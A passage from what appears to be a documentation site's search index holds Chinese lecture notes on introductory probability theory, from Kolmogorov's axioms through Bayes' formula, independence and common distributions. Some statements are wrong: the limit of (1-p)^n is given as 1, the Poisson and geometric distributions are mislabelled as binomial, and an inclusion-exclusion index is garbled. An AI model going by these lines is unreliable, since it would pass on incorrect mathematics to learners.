\u6b21\u8bd5\u9a8c\u4e2d\uff0c\u968f\u7740\u8bd5\u9a8c\u6b21\u6570 \\(n\\) \u7684\u589e\u52a0\uff0c\u4e8b\u4ef6\u7684\u9891\u7387\u5c06\u5728\u67d0\u4e2a\u6570\u503c \\(p\\) \u9644\u8fd1\u7a33\u5b9a\u5730\u6446\u52a8\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\\(n\\) \u8d8a\u5927\uff0c\u6446\u52a8\u7684\u5e45\u5ea6\u8d8a\u5c0f\uff0c\u6b64\u6570\u503c\u53ef\u5b9a\u4e49\u4e3a \\(A\\) \u53d1\u751f\u5730\u6982\u7387\uff0c\u79f0\u4e3a\u7edf\u8ba1\u6982\u7387.</p> <p>1933 \u5e74\uff0c\u82cf\u8054\u6570\u5b66\u5bb6\u67ef\u5c14\u83ab\u54e5\u6d1b\u592b(Kolmogorov)\u63d0\u51fa\u4e86\u6982\u7387\u7684\u516c\u7406\u5316\u5b9a\u4e49\uff0c\u901a\u8fc7\u89c4\u5b9a\u6982\u7387\u5e94\u5177\u6709\u7684\u57fa\u672c\u6027\u8d28\u6765\u5b9a\u4e49\u6982\u7387\uff0c\u7531\u6b64\u5efa\u7acb\u4e86\u6982\u7387\u8bba\u7684\u7406\u8bba\u4f53\u7cfb.</p> <p>\u6982\u7387\u7684\u516c\u7406\u5316\u5b9a\u4e49\u3010Def. 1.1\u3011\uff1a\u8bbe \\(E\\) \u662f\u968f\u673a\u8bd5\u9a8c\uff0c\\(\\Omega\\) \u4e3a\u5176\u6837\u672c\u7a7a\u95f4. \u5bf9\u4e8e \\(E\\) \u7684\u6bcf\u4e00\u4e2a\u968f\u673a\u4e8b\u4ef6 \\(A\\)\uff0c\u5bf9\u5e94\u4e00\u4e2a\u5b9e\u6570 \\(\\mathrm{Pr}(A)\\)\uff0c\u5982\u679c\u96c6\u5408\u51fd\u6570 \\(\\mathrm{Pr}(\\cdot)\\) \u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6\uff0c\u5219\u79f0 \\(\\mathrm{Pr}(A)\\) \u4e3a\u4e8b\u4ef6 \\(A\\) \u7684\u6982\u7387\uff1a</p> <ol> <li>\u975e\u8d1f\u6027\uff1a\\(\\mathrm{Pr}(A)\\geqslant 0\\).</li> <li>\u89c4\u8303\u6027\uff1a\\(\\mathrm{Pr}(\\varOmega)=1\\).</li> <li> <p>\u53ef\u5217\u53ef\u52a0\u6027\uff1a\u82e5 \\(A_1, A_2, \\cdots A_n, \\cdots\\) \u4e24\u4e24\u4e92\u4e0d\u76f8\u5bb9\uff0c\u5219</p> \\[ \\mathrm{Pr}\\left(\\bigcup_{i=1}^{\\infty} A_i\\right)=\\sum_{i=1}^{\\infty}\\mathrm{Pr}(A_i) \\] </li> </ol> <p>\u6982\u7387\u7684\u4e00\u4e9b\u6027\u8d28\uff1a</p> <ol> <li> <p>\\(\\mathrm{Pr}(\\varPhi)=0\\).</p> <p>proof. Trivial. (P6)</p> </li> <li> <p>\u82e5 \\(A_1, A_2, \\cdots A_n\\) \u4e24\u4e24\u4e92\u4e0d\u76f8\u5bb9\uff0c\u5219</p> \\[ \\mathrm{Pr}\\left(\\bigcup_{i=1}^{n} A_i\\right)=\\sum_{i=1}^{n}\\mathrm{Pr}(A_i) \\] <p>proof. Trivial. (P6)</p> </li> <li> <p>\u5bf9\u4efb\u610f\u4e24\u4e8b\u4ef6 \\(A, B\\)\uff0c\u6709 \\(\\mathrm{Pr}(A-B)=\\mathrm{Pr}(A)-\\mathrm{Pr}(AB)\\).</p> <p>proof. Trivial. (P6)</p> </li> <li> <p>\u5bf9\u4efb\u610f\u4e24\u4e8b\u4ef6 \\(A,B\\)\uff0c\u6709\u52a0\u6cd5\u5b9a\u7406\uff1a</p> \\[ \\mathrm{Pr}(A\\cup B)=\\mathrm{Pr}(A)+\\mathrm{Pr}(B)-\\mathrm{Pr}(AB) \\] <p>proof. Trivial. (P6)</p> <p>\u5229\u7528\u5f52\u7eb3\u6cd5\uff0c\u53ef\u63a8\u5e7f\u5230 \\(n\\) \u4e2a\u4e8b\u4ef6\u7684\u52a0\u6cd5\u5b9a\u7406\uff1a</p> \\[ \\mathrm{Pr}\\left(\\bigcup_{i=1}^{n} A_i\\right)=\\sum_{i=1}^{n}(-1)^{i-1}\\sum_{1\\leqslant a_1&lt;a_2&lt;\\cdots&lt;a_i\\leqslant n}\\mathrm{Pr}\\left(\\bigcap_{j=1}^{i}A_j\\right) \\] </li> <li> <p>\u5bf9\u4efb\u610f\u4e8b\u4ef6 \\(A\\)\uff0c\u6709 \\(\\mathrm{Pr}\\left(\\overline{A}\\right)=1-\\mathrm{Pr}(A)\\).</p> <p>proof. Trivial. (P7)</p> </li> </ol> <p>\u7b49\u53ef\u80fd\u6982\u578b/\u53e4\u5178\u6982\u578b\uff1a\u5177\u6709\u5982\u4e0b\u7279\u70b9\u7684\u4e00\u7c7b\u968f\u673a\u8bd5\u9a8c\uff1a</p> <ol> <li>\u6837\u672c\u7a7a\u95f4 \\(\\varOmega\\) \u7684\u6837\u672c\u70b9\u4e2a\u6570\u4e3a\u6709\u9650\u4e2a.</li> <li>\u6837\u672c\u7a7a\u95f4\u4e2d\u7684\u6bcf\u4e2a\u57fa\u672c\u4e8b\u4ef6/\u6837\u672c\u70b9\u53d1\u751f\u7684\u53ef\u80fd\u6027\u76f8\u540c.</li> </ol> <p>\u5176\u4e3a\u6982\u7387\u8bba\u53d1\u5c55\u521d\u671f\u7684\u4e3b\u8981\u7814\u7a76\u5bf9\u8c61\uff0c\u6545\u79f0\u4e3a\u53e4\u5178\u6982\u578b.</p> <p>\u7279\u70b9\uff1a</p> <p>\u8bbe\u968f\u673a\u8bd5\u9a8c \\(E\\) \u4e3a\u7b49\u53ef\u80fd\u6982\u578b\uff0c\u82e5\u5176\u6837\u672c\u7a7a\u95f4 \\(\\varOmega\\) \u542b\u6709 \\(n\\) \u4e2a\u6837\u672c\u70b9\uff0c\u800c\u4e8b\u4ef6 A \u542b\u6709 \\(m\\) \u4e2a\u6837\u672c\u70b9\uff0c\u5219\u4e8b\u4ef6 \\(A\\) \u7684\u6982\u7387\u4e3a \\(\\mathrm{Pr}(A)=\\dfrac{m}{n}\\).</p> <p>\u62bd\u7b7e\u539f\u7406\uff1a\u888b\u4e2d\u6709 \\(a\\) \u53ea\u767d\u7403\uff0c\\(b\\) \u53ea\u7ea2\u7403\uff0c\u82e5\u5e72\u4eba\u4f9d\u6b21\u4ece\u4e2d\u5404\u53d6\u4e00\u7403\uff0c\u53d6\u540e\u4e0d\u59a8\u4f1a\uff0c\u5219\u4efb\u4e00\u4eba\u53d6\u5f97\u7ea2\u7403\u7684\u6982\u7387\u76f8\u7b49\uff0c\u90fd\u662f \\(\\dfrac{a}{a+b}\\).</p> <p>\u51e0\u4f55\u6982\u7387\uff1a\u82e5\u968f\u673a\u8bd5\u9a8c\u7684\u6837\u672c\u7a7a\u95f4 \\(\\varOmega\\) \u5bf9\u5e94\u4e00\u4e2a\u5ea6\u91cf\u6709\u9650\u7684\u51e0\u4f55\u533a\u57df S\uff0c\u4e14\u6240\u6709\u7684\u57fa\u672c\u4e8b\u4ef6\u4e0e \\(S\\) \u5185\u7684\u70b9\u4e00\u4e00\u5bf9\u5e94\uff0c\u5219\u4efb\u4e00\u968f\u673a\u4e8b\u4ef6 \\(A\\) \u5bf9\u5e94 \\(\\varOmega\\) \u4e2d\u7684\u67d0\u4e00\u5b50\u533a\u57df \\(D\\). \u82e5\u4e8b\u4ef6 \\(A\\) \u7684\u6982\u7387\u53ea\u548c \\(A\\) \u5bf9\u5e94\u7684\u533a\u57df \\(D\\) \u7684\u5ea6\u91cf\u6210\u6b63\u6bd4\uff0c\u4e0e \\(D\\) \u7684\u5f62\u72b6\u53ca \\(D\\) \u5728 \\(S\\) \u4e2d\u7684\u4f4d\u7f6e\u65e0\u5173\uff0c\u5219 \\(A\\) \u53d1\u751f\u7684\u6982\u7387\u5b9a\u4e49\u4e3a \\(\\mathrm{Pr}(A)=\\dfrac{m(A)}{m(\\varOmega)}\\)\uff0c\u5176\u4e2d \\(m(X)\\) \u4e3a \\(X\\) \u5bf9\u5e94\u533a\u57df\u7684\u5ea6\u91cf. </p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-1-%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#p12","title":"\u56db\u3001\u6761\u4ef6\u6982\u7387\uff08P12\uff09","text":"<p>\u5b9a\u4e49\uff1a\u67d0\u4e8b\u4ef6 \\(A\\) \u5728\u53e6\u4e00\u4e8b\u4ef6 \\(B\\) \u53d1\u751f\u60c5\u51b5\u4e4b\u4e0b\u53d1\u751f\u7684\u6982\u7387\uff0c\u8bb0\u4f5c \\(\\mathrm{Pr}(A|B)\\).</p> <p>\u516c\u7406\u5316\u5b9a\u4e49\uff1a\u8bbe \\(A,B\\) \u4e3a\u4e24\u4e2a\u968f\u673a\u4e8b\u4ef6\uff0c\\(P(B)&gt;0\\)\uff0c\u79f0 \\(\\mathrm{Pr}(A|B)=\\dfrac{\\mathrm{Pr}(AB)}{\\mathrm{Pr}(B)}\\) \u4e3a\u5728\u4e8b\u4ef6 \\(B\\) \u53d1\u751f\u7684\u6761\u4ef6\u4e4b\u4e0b\uff0c\u4e8b\u4ef6 \\(A\\) \u53d1\u751f\u7684\u6982\u7387. </p> <p>\u6027\u8d28\uff1a\u5bb9\u6613\u9a8c\u8bc1\u6761\u4ef6\u6982\u7387 \\(\\mathrm{Pr}(\\cdot|B)\\) \u6ee1\u8db3\u6982\u7387\u5b9a\u4e49\u7684\u4e09\u4e2a\u6761\u4ef6\uff1a\u975e\u8d1f\u6027\u3001\u89c4\u8303\u6027\u3001\u53ef\u5217\u53ef\u52a0\u6027.</p> <p>\u4e58\u6cd5\u516c\u5f0f\uff1a\u6761\u4ef6\u6982\u7387\u5b9a\u4e49\u53d8\u5f62\uff1a\\(\\mathrm{Pr}(AB)=\\mathrm{Pr}(B)\\mathrm{Pr}(A|B)\\).</p> <p>\u5f53\u7136\u5176\u53ef\u4ee5\u53cd\u8fc7\u6765\uff1a\\(\\mathrm{Pr}(AB)=\\mathrm{Pr}(A)\\mathrm{Pr}(B|A)\\).</p> <p>\u5f53\u7136\u5176\u53ef\u4ee5\u518d\u5bf9 \\(B\\) \u8fdb\u884c\u5c55\u5f00\uff0c\u5f97\u5230\u591a\u5143\u7248\u672c\uff1a</p> \\[ \\mathrm{Pr}(A_1A_2\\cdots A_n)=\\mathrm{Pr}(A_1)\\mathrm{Pr}(A_2|A_1)\\mathrm{Pr}(A_3|A_1A_2)\\cdots\\mathrm{Pr}(A_n|A_1A_2\\cdots A_{n-1}) \\] <p>\u5212\u5206/\u5b8c\u5907\u4e8b\u4ef6\u7ec4\uff1a\u82e5 \\(n\\) \u4e2a\u4e8b\u4ef6 \\(A_1,A_2,\\cdots,A_n\\) \u6ee1\u8db3</p> <p>(1) \\(A_1,A_2,\\cdots,A_n\\) \u4e24\u4e24\u4e92\u4e0d\u76f8\u5bb9.</p> <p>(2) . .</p> <p>\u5219\u79f0 \\(A_1,A_2,\\cdots,A_n\\) \u4e3a\u6837\u672c\u7a7a\u95f4 \\(\\varOmega\\) \u7684\u4e00\u4e2a\u5212\u5206\u6216\u5b8c\u5907\u4e8b\u4ef6\u7ec4. \u5728\u968f\u673a\u8bd5\u9a8c\u7684\u6bcf\u6b21\u8bd5\u9a8c\u4e2d\uff0c\\(A_1,A_2,\\cdots,A_n\\) \u5fc5\u53d1\u751f\u4e00\u4e2a\u4e14\u4ec5\u53d1\u751f\u4e00\u4e2a.</p> <p>\u5168\u6982\u7387\u516c\u5f0f\uff1a\u8bbe \\(A_1, A_2,\\cdots, A_n\\) \u4e3a\u5b8c\u5907\u4e8b\u4ef6\u7ec4\uff0c\u5219\u5bf9\u4e8b\u4ef6 \\(B\\) \u6709\uff1a</p> \\[ \\mathrm{Pr}(B)=\\sum_{k=1}^{n}\\mathrm{Pr}(A_k)\\mathrm{Pr}(B|A_k) \\] <p>\u8d1d\u53f6\u65af\u516c\u5f0f\uff1a\u8bbe \\(A_1, A_2,\\cdots, A_n\\) \u4e3a\u5b8c\u5907\u4e8b\u4ef6\u7ec4\uff0c\u5219\u5bf9\u4e8b\u4ef6 \\(B\\) \u6709</p> \\[ \\mathrm{Pr}(A_i|B)=\\dfrac{\\mathrm{Pr}(A_i)\\mathrm{Pr}(B|A_i)}{\\sum_{k=1}^{n}\\mathrm{Pr}(A_k)\\mathrm{Pr}(B|A_k)} \\]"},{"location":"in_class_learning/semester_3/probability_theory/Ch-1-%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#p18","title":"\u4e94\u3001\u72ec\u7acb\u6027\uff08P18\uff09","text":"<p>\u72ec\u7acb\u6027\uff1a\u8bbe \\(A,B\\) \u662f\u4e24\u4e2a\u968f\u673a\u4e8b\u4ef6\uff0c\u82e5\u6ee1\u8db3 \\(\\mathrm{Pr}(AB)=\\mathrm{Pr}(A)\\mathrm{Pr}(B)\\)\uff0c\u5219\u79f0\u4e8b\u4ef6 \\(A,B\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u7b80\u79f0 \\(A,B\\) \u72ec\u7acb.</p> <p>\u591a\u4e2a\u4e8b\u4ef6\u7684\u72ec\u7acb\u6027\uff1a</p> <p>\u4e09\u4e2a\u4e8b\u4ef6\u7684\u72ec\u7acb\u6027\uff1a\u8bbe \\(A,B,C\\) \u662f\u4e09\u4e2a\u968f\u673a\u4e8b\u4ef6\uff0c\u82e5\uff1a</p> \\[ \\begin{cases} \\mathrm{Pr}(AB)=\\mathrm{Pr}(A)\\mathrm{Pr}(B)\\\\ \\mathrm{Pr}(BC)=\\mathrm{Pr}(B)\\mathrm{Pr}(C)\\\\ \\mathrm{Pr}(CA)=\\mathrm{Pr}(C)\\mathrm{Pr}(A)\\\\ \\mathrm{Pr}(ABC)=\\mathrm{Pr}(A)\\mathrm{Pr}(B)\\mathrm{Pr}(C) \\end{cases} \\] <p>\u5219\u79f0\u4e09\u4e8b\u4ef6\u76f8\u4e92\u72ec\u7acb\uff0c\u6ce8\u610f\u8fd9\u548c\u4e09\u4e8b\u4ef6\u4e24\u4e24\u72ec\u7acb\u6709\u533a\u522b.</p> <p>\\(n\\) \u4e2a\u4e8b\u4ef6\u7684\u72ec\u7acb\u6027\uff1a\u8bbe \\(A_1,A_2,\\cdots,A_n\\) \u4e3a \\(n\\) \u4e2a\u968f\u673a\u4e8b\u4ef6.</p> \\[ \\mathrm{Pr}(A_{i_1}A_{i_2}\\cdots A_{i_k})=\\mathrm{Pr}(A_{i_1})\\mathrm{Pr}(A_{i_2})\\cdots\\mathrm{Pr}(A_{i_k}),\\\\1\\le i_1&lt;i_2&lt;\\cdots&lt;i_k\\le n,k=2,3,\\cdots,n \\] <p>\u5219\u79f0\u4e8b\u4ef6 \\(A_1,A_2,\\cdots,A_k\\) \u76f8\u4e92\u72ec\u7acb.</p> <p>\u5206\u7ec4\u72ec\u7acb\u6027\u5b9a\u7406\uff1a\u8bbe\u4e8b\u4ef6 \\(A_1,A_2,\\cdots,A_n\\) \u76f8\u4e92\u72ec\u7acb\uff0c\u5c06\u5176\u4efb\u610f\u5206\u4e3a\u6ca1\u6709\u516c\u5171\u4e8b\u4ef6\u7684 \\(k\\) \u4e2a\u7ec4\uff0c\u6bcf\u4e2a\u7ec4\u4efb\u610f\u4f5c\u4e8b\u4ef6\u8fd0\u7b97\uff0c\u5f97\u5230\u5171 \\(k\\) \u4e2a\u65b0\u4e8b\u4ef6\uff0c\u5219\u8fd9 \\(k\\) \u4e2a\u65b0\u4e8b\u4ef6\u76f8\u4e92\u72ec\u7acb.</p> <p>\u5c0f\u6982\u7387\u4e8b\u4ef6\u539f\u7406\uff1a\u8bbe\u968f\u673a\u8bd5\u9a8c\u4e2d\u67d0\u4e8b\u4ef6 \\(A\\) \u53d1\u751f\u7684\u6982\u7387\u4e3a \\(p\\)\uff0c\u65e0\u8bba \\(p&gt;0\\) \u591a\u4e48\u5c0f\uff0c\u53ea\u8981\u4e0d\u65ad\u72ec\u7acb\u91cd\u590d\u5730\u505a \\(n\\) \u6b21\u8bd5\u9a8c\uff0c\\(A\\) \u8fdf\u65e9\u4f1a\u53d1\u751f\u7684\u6982\u7387\u4e3a \\(1\\)\uff0c\u5176\u53ea\u56e0 \\((1-p)^n\\to 1\\) \u5f53 \\(n\\to +\\infty\\).</p> <p>\u53ef\u9760\u6027\u5206\u6790\uff1a\u4e00\u4e2a\u5143\u4ef6\u6216\u4e00\u4e2a\u7cfb\u7edf\u7684\u53ef\u9760\u6027\u662f\u6307\u5176\u6b63\u5e38\u5de5\u4f5c\u7684\u6982\u7387\uff0c\u53ef\u9760\u6027\u5206\u6790\u9700\u8981\u8ba8\u8bba\u6309\u4e00\u5b9a\u65b9\u5f0f\u8fde\u63a5\u7684\u591a\u4e2a\u72ec\u7acb\u5143\u4ef6\u6216\u5b50\u7cfb\u7edf\u6b63\u5e38\u5de5\u4f5c\u7684\u6982\u7387\uff0c\u8fde\u63a5\u65b9\u5f0f\u6709\u4e32\u8054\u3001\u5e76\u8054\u4e0e\u4e32\u5e76\u8054\u6df7\u5408. \u4e32\u8054\u5219\u9700\u8981\u6240\u6709\u5143\u4ef6\u5747\u6b63\u5e38\u5de5\u4f5c\uff0c\u5373\u4e8b\u4ef6\u4ea4\uff1b\u5e76\u8054\u53ea\u9700\u6240\u6709\u5143\u4ef6\u4e0d\u5168\u4e0d\u6b63\u5e38\u5de5\u4f5c\uff0c\u5373\u4e8b\u4ef6\u5e76.</p> <p>\\(n\\) \u91cd\u4f2f\u52aa\u5229\u8bd5\u9a8c\uff1a\u662f\u4e00\u7c7b\u91cd\u8981\u7684\u72ec\u7acb\u91cd\u590d\u8bd5\u9a8c\u6982\u578b\uff0c\u5176\u5177\u6709\u5982\u4e0b\u4e24\u4e2a\u7279\u70b9\uff1a</p> <p>(1) \u6bcf\u6b21\u8bd5\u9a8c\u53ea\u6709\u4e24\u4e2a\u7ed3\u679c\uff0c\\(A\\) \u4e0e \\(\\overline{A}\\)\uff0c\u4e14 \\(\\mathrm{Pr}(A)=p, \\mathrm{Pr}(\\overline{A})=1-p=q\\).</p> <p>(2) \u8bd5\u9a8c\u8fdb\u884c \\(n\\) \u6b21\uff0c\u6bcf\u6b21\u8bd5\u9a8c\u7684\u7ed3\u679c\u76f8\u4e92\u72ec\u7acb.</p> <p>\u6cca\u677e\u5b9a\u7406\uff1a\u8bbe \\(n\\) \u4e3a\u6b63\u6574\u6570\uff0c\\(\\lambda = np_n\\) \u4e3a\u5e38\u6570\uff0c\u5219\u5bf9\u4efb\u610f\u6b63\u6574\u6570 \\(k\\) \u6709\uff1a</p> \\[ \\lim_{n\\to \\infty}\\binom{n}{k}{p_n}^{k}(1-p_n)^{n-k}=\\dfrac{\\lambda^k}{k!}\\mathrm{e}^{-\\lambda} \\]"},{"location":"in_class_learning/semester_3/probability_theory/Ch-2-%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/","title":"Ch.2 \u968f\u673a\u53d8\u91cf\u53ca\u5176\u6982\u7387\u5206\u5e03","text":""},{"location":"in_class_learning/semester_3/probability_theory/Ch-2-%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#_1","title":"\u968f\u673a\u53d8\u91cf","text":"<p>\u5b9a\u4e49\uff1a\u8bbe \\(\\varOmega=\\{e\\}\\) \u662f\u968f\u5373\u8bd5\u9a8c\u7684\u6837\u672c\u7a7a\u95f4\uff0c\u5982\u679c\u5bf9\u6bcf\u4e2a \\(e\\in\\varOmega\\)\uff0c\u90fd\u5bf9\u5e94\u4e00\u4e2a\u5355\u503c\u5b9e\u51fd\u6570 \\(X=X(e)\\)\uff0c\u5219\u79f0 \\(X\\) \u4e3a\u968f\u673a\u53d8\u91cf.</p> <p>\u6982\u7387\u5206\u5e03\uff1a\u968f\u673a\u53d8\u91cf \\(X\\) \u53d6\u503c\u7684\u6982\u7387\u79f0\u4e3a \\(X\\) \u7684\u6982\u7387\u5206\u5e03.</p> <p>\u968f\u673a\u53d8\u91cf\u7684\u5206\u5e03\u51fd\u6570\uff1a\u8bbe \\(X\\) \u4e3a\u4e00\u4e2a\u968f\u5373\u53d8\u91cf\uff0c\\(x\\) \u662f\u4efb\u4f55\u5b9e\u6570\uff0c\u79f0\u51fd\u6570</p> \\[ F(x)=\\mathrm{Pr}(X\\le x),-\\infty&lt;x&lt;+\\infty \\] <p>\u4e3a\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u5206\u5e03\u51fd\u6570.</p> <p>\u5206\u5e03\u51fd\u6570\u7684\u6027\u8d28\uff1a</p> <p>(1) \\(F(x)\\) \u5355\u8c03\u4e0d\u51cf\uff0c\u5373 \\(\\forall x_1&lt;x_2\\) \u6709 \\(F(x_1)\\le F(x_2)\\).</p> <p>(2) \\(0\\le F(x)\\le 1\\) \u4e14 \\(F(-\\infty)=\\lim_{x\\to-\\infty}F(x)=0,F(+\\infty)=\\lim_{x\\to +\\infty}F(x)=1\\).</p> <p>(3) \\(F(x)\\) \u53f3\u8fde\u7eed\uff0c\u5373 \\(F(x_0+0)=\\lim_{x\\to x_0^+}F(x)=F(x_0)\\).</p> <p>\u4efb\u4e00\u968f\u673a\u53d8\u91cf\u7684\u5206\u5e03\u51fd\u6570\u5fc5\u7136\u6ee1\u8db3\u4ee5\u4e0a\u4e09\u6761\u6027\u8d28\uff0c\u6ee1\u8db3\u4ee5\u4e0a\u4e09\u6761\u6027\u8d28\u7684\u4efb\u4e00\u51fd\u6570\u5fc5\u7136\u662f\u67d0\u968f\u673a\u53d8\u91cf\u7684\u5206\u5e03\u51fd\u6570.</p>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-2-%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#_2","title":"\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\u53ca\u5176\u5206\u5e03","text":"<p>\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\uff1a\u82e5\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u53ef\u80fd\u53d6\u503c\u4e3a\u6709\u9650\u4e2a\u6216\u53ef\u5217\u65e0\u9650\u591a\u4e2a\uff0c\u5219\u79f0\u5176\u4e3a\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf.</p> <p>\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\u7684\u5206\u5e03\u5f8b\uff1a\u8bbe\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u6240\u6709\u53ef\u80fd\u53d6\u503c\u4e3a \\(x_1,x_2,\\cdots,x_n,\\cdots\\)\uff0c\\(X\\) \u53d6\u503c \\(x_k\\) \u7684\u76f8\u5e94\u6982\u7387\u4e3a p_k\uff0c\u5373\uff1a</p> \\[ \\mathrm{Pr}(X=x_k)=p_k,k=1,2,\\cdots \\] <p>\u79f0\u5176\u4e3a\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u5206\u5e03\u5f8b\uff0c\u6216\u4ee5\u8868\u683c\u5f62\u5f0f\u7ed9\u51fa\uff1a</p> <pre><code>X | x_1 | x_2 | ... | x_n | ...\n--+-----+-----+-----+-----+-----\nP | p_1 | p_2 | ... | p_n | ...\n</code></pre> <p>\u5206\u5e03\u5f8b\u7684\u6027\u8d28\uff1a</p> <p>(1) \\(p_k\\ge 0,k=1,2,\\cdots\\).</p> <p>(2) \\(\\sum_{k}p_k=1\\).</p> <p>\u5e38\u7528\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf\u5206\u5e03\uff1a</p> <ul> <li> <p>0-1 \u5206\u5e03\u3001\u4e24\u70b9\u5206\u5e03\u3001Bernoulli \u5206\u5e03</p> <p>\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf \\(X\\) \u670d\u4ece\u53c2\u6570\u4e3a \\(p\\) \u7684 0-1 \u5206\u5e03\uff0c\u8bb0\u4e3a \\(X\\sim B(1,p)\\).</p> <p>\u5206\u5e03\u5f8b\uff1a</p> \\[ \\text{Pr}(X=1)=p, \\text{Pr}(X=0)=q \\] <p>\u5176\u4e2d\uff1a\\(0&lt;p&lt;1, q = 1 - p\\) </p> <p>\u671f\u671b\u4e0e\u65b9\u5dee\uff1a</p> \\[ \\text{E}(X)=p,\\text{Var}(X)=pq \\] </li> <li> <p>\u4e8c\u9879\u5206\u5e03</p> <p>\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf \\(X\\) \u670d\u4ece\u53c2\u6570\u4e3a \\(n,p\\) \u7684\u4e8c\u9879\u5206\u5e03\uff0c\u8bb0\u4e3a \\(X\\sim B(n,p)\\).</p> <p>\u5206\u5e03\u5f8b\uff1a</p> \\[ \\text{Pr}(X=k)=\\binom{n}{k}p^kq^{n-k},k=0,1,\\cdots,n \\] <p>\u5176\u4e2d\uff1a\\(0&lt;p&lt;1,q=1-p\\) </p> <p>\u671f\u671b\u4e0e\u65b9\u5dee\uff1a</p> \\[ \\text{E}(X)=np,\\text{Var}(X)=npq \\] </li> <li> <p>\u6cca\u677e\u5206\u5e03\u3001Poisson \u5206\u5e03</p> <p>\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf \\(X\\) \u670d\u4ece\u53c2\u6570\u4e3a \\(\\lambda\\) \u7684\u4e8c\u9879\u5206\u5e03\uff0c\u8bb0\u4e3a \\(X\\sim P(\\lambda)\\).</p> <p>\u5206\u5e03\u5f8b\uff1a</p> \\[ \\text{Pr}(X=k)=\\dfrac{\\lambda^k}{k!}\\mathrm{e}^{-\\lambda} \\] <p>\u5176\u4e2d \\(\\lambda&gt;0\\) \u4e3a\u5e38\u6570.</p> <p>\u671f\u671b\u4e0e\u65b9\u5dee\uff1a</p> \\[ \\text{E}(X)=\\lambda,\\text{Var}(X)=\\lambda \\] <p>\u6cca\u677e\u5206\u5e03\u5e38\u7528\u4e8e\u63cf\u8ff0\u5927\u91cf\u65f6\u95f4\u4e2d\u7a00\u6709\u4e8b\u4ef6\u51fa\u73b0\u9891\u6570\u7684\u6982\u7387\u6a21\u578b.</p> </li> <li> <p>\u51e0\u4f55\u5206\u5e03</p> <p>\u79bb\u6563\u578b\u968f\u673a\u53d8\u91cf \\(X\\) \u670d\u4ece\u53c2\u6570\u4e3a \\(p\\) \u7684\u4e8c\u9879\u5206\u5e03\uff0c\u8bb0\u4e3a \\(X\\sim G(p)\\).</p> <p>\u5206\u5e03\u5f8b\uff1a</p> \\[ \\text{Pr}(X=k)=q^{k-1}p,k=1,2,3,\\cdots \\] <p>\u5176\u4e2d\uff1a\\(0&lt;p&lt;1\\) \u662f\u5e38\u6570\uff0c\\(q=1-p\\).</p> <p>\u671f\u671b\u4e0e\u65b9\u5dee\uff1a</p> \\[ \\text{E}(X)=\\dfrac{1}{p},\\text{Var}(X)=\\dfrac{q}{p^2} \\] <p>\u51e0\u4f55\u5206\u5e03\u7684\u65e0\u8bb0\u5fc6\u6027\uff1a\\(\\text{Pr}(X=s+t|X&gt;t)=\\text{Pr}(X=s)\\)</p> </li> </ul>"},{"location":"in_class_learning/semester_3/probability_theory/Ch-2-%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#_3","title":"\u8fde\u7eed\u6027\u968f\u673a\u53d8\u91cf\u53ca\u5176\u5206\u5e03","text":"<p>\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\uff1a\u5176\u53d6\u503c\u4e0d\u80fd\u4e00\u4e00\u5217\u4e3e. \u8bbe\u968f\u673a\u53d8\u91cf \\(X\\) \u7684\u5206\u5e03\u51fd\u6570\u4e3a \\(F(x)\\)\uff0c\u82e5\u5b58\u5728\u975e\u8d1f\u53ef\u79ef\u51fd\u6570 \\(p(x)\\)\uff0c\u5bf9\u4efb\u610f\u5b9e\u6570 \\(x\\) \u6709\uff1a</p> \\[ F(x)=\\int_{-\\infty}^{x}p(t)\\mathrm{d}t \\] <p>\u5219\u79f0 \\(X\\) \u4e3a\u8fde\u7eed\u578b\u968f\u673a\u53d8\u91cf\uff0c\u79f0\u51fd\u6570 \\(p(x)\\) \u4e3a \\(X\\) \u7684\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\uff0c\u7b80\u79f0\u5bc6\u5ea6\u51fd\u6570.</p> <p>\u5bc6\u5ea6\u51fd\u6570\u7684\u6027\u8d28\uff1a</p> <p>(1) \\(p(x)\\ge 0\\).</p> <p>(2) \\(\\int_{-\\infty}^{+\\infty}p(x)\\mathrm{d}x=1\\).</p> <p>(3) \\(\\forall a&lt;b, P(a&lt;X\\le b)=F(b)-F(a)=\\int_{a}^{b}p(x)\\mathrm{d}x\\).</p> <p>(4) \u56e0 \\(p(x)\\) \u53ef\u79ef\uff0c\u6839\u636e\u5fae\u79ef\u5206\u6027\u8d28\uff0c\\(F(x)\\) \u8fde\u7eed.</p> <p>(5) \u82e5 \\(p(x)\\) \u5728\u70b9 \\(x\\) \u5904\u8fde\u7eed\uff0c\u5219 \\(F(x)\\) \u5728 \\(x\\) \u5904\u53ef\u5bfc\uff0c\u4e14 \\(p(x)=F\u2019(x)\\).</p> 